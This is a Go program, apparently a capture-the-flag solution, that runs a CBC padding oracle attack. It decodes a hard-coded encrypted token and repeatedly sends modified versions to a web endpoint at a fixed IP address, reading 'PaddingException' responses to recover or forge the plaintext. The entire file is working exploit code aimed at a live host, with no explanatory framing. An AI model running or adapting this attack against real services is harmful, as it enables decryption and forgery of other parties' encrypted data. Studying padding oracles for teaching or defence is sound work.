package main

import (
	"crypto/aes"
	"cryptography-go/utils"
	"encoding/base64"
	"errors"
	"io/ioutil"
	"log"
	"net/http"
	"strconv"
	"strings"
)

const (
	urlBase   = "http://34.94.3.143/be9d8629d8/"
	authToken = "LrY2wVfOyCxuoakQwb!qa8yLmiprZyN540dL0cQba789vqcVHF!xStYkUv!UDP3QI2UTuYOIU-qarqH6aJZfSvRLFwNnFzIg0i-jZEfB0hKzcn4kjYL!q5NDe2w1JqPGAD3GzMAGp326gpb-CZxpagMYchfsRP8AXNzr2KSl9MlBf5s1OcFGj-qmmeJEFyrRESIjX35HfQ!zBCXzFRHE3A~~"
)

func main() {
	decoded := decodePBToken(authToken)
	bs := aes.BlockSize

	// break ciphertext into blocksize chunks
	chunks := utils.BuildChunks(decoded, bs)
	// fmt.Println("[*] Splitting into chunks:")
	// for i := 0; i < len(chunks); i++ {
	// 	fmt.Printf("%d: %v\n", i, chunks[i])
	// }

	utils.PaddingOracle(chunks, urlBase, callOracle, encodePBToken)
}

func fatal(err error) {
	if err != nil {
		log.Fatalln(err)
	}
}

func decodePBToken(token string) []byte {
	// b64d = lambda x: base64.decodestring(x.replace('~', '=').replace('!', '/').replace('-', '+'))
	r := strings.NewReplacer("~", "=", "!", "/", "-", "+")
	decoded, err := base64.StdEncoding.DecodeString(r.Replace(token))
	fatal(err)
	return decoded
}

func encodePBToken(buffer []byte) string {
	r := strings.NewReplacer("=", "~", "/", "!", "+", "-")
	return r.Replace(base64.StdEncoding.EncodeToString(buffer))
}

func callOracle(u, token string) (bool, error) {
	req, err := http.NewRequest("GET", u, nil)
	fatal(err)
	q := req.URL.Query()
	q.Add("post", token)
	req.URL.RawQuery = q.Encode()

	client := &http.Client{}
	resp, err := client.Do(req)
	fatal(err)
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		err = errors.New(u +
			"\nresp.StatusCode: " + strconv.Itoa(resp.StatusCode))
		return false, err
	}

	body, _ := ioutil.ReadAll(resp.Body)
	if isValidPad(string(body)) {
		return true, nil
	}
	return false, nil
}

func isValidPad(body string) bool {
	// Response body contains text "Invalid padding"
	if strings.Contains(body, "PaddingException") {
		return false
	}
	return true
}
